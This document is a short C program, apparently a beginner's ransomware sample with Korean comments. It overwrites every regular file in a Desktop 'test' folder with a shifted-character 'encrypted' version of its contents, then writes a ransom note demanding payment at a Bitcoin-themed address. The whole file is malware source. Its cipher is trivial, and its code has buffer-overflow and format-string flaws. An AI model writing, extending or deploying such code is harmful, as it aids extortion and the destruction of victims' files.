#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <ctype.h>
char *encrypt(char *dest, const char *src) {
    char *origin;
    for (origin = dest; *src; src++) { 
        int code_point = (int) *src; 
        code_point += 3; 
        *dest++ = (char) code_point; 
    }
    *dest = '\0'; 
    return origin;
}
int main() {
    char *userprofile = getenv("USERPROFILE"); // 환경 변수 가져오기


    DIR *dir;
    struct dirent *ent;
    char folderpath[1000]; // 폴더 경로
    char filepath2[1000]; // 파일 경로
    

    sprintf(folderpath, "%s\\Desktop\\test", userprofile); // 폴더 경로 설정
    dir = opendir(folderpath); // 폴더 열기
    if (dir == NULL) {
        printf("dir open failed\n");
        return 1;
    }
    while ((ent = readdir(dir)) != NULL) { // 폴더 내 파일 리스트 가져오기
    
        if (ent->d_type == DT_REG) { // 파일인 경우
            char filecontent[1000] = "";
            sprintf(filepath2, "%s\\%s", folderpath, ent->d_name); // 파일 경로 설정
            FILE *fp = fopen(filepath2, "r"); // 파일 열기
            if (fp == NULL) {
                printf("file open failed\n");
                return 1;
            }
            // 파일 내용 읽기
            char buffer[1000];
            while (fgets(buffer, 1000, fp) != NULL) {
                strcat(filecontent, buffer);
            }
            printf("%s\n",filecontent);
            //암호화
            
            char en_str[1000];
            encrypt(en_str, filecontent);
            printf("encrypted: %s\n", en_str);
            FILE *fp1 = fopen(filepath2, "w");
            fprintf(fp1, en_str);
            fclose(fp); // 파일 닫기
            fclose(fp1);
        }
    }
    closedir(dir); // 폴더 닫기
    

    char filepath[1000]; // 파일 경로
    char *filename = "README!.txt"; // 파일 이름
    sprintf(filepath, "%s\\Desktop\\test\\%s", userprofile, filename); // 파일 경로 설정 filepath 에 userprofile\Desktop\filename 이렇게 넣겠다는뜻
    
    FILE *fp = fopen(filepath, "w"); // 파일 열기
    if (fp == NULL) {
        printf("file open failed\n");
        return 1;
    }
    
    // 파일 쓰기
    fprintf(fp, "if u wanna decrypt file, show me the money here bitcoin.kyokyo.com \n");
    fclose(fp); // 파일 닫기
    return 0;
    
}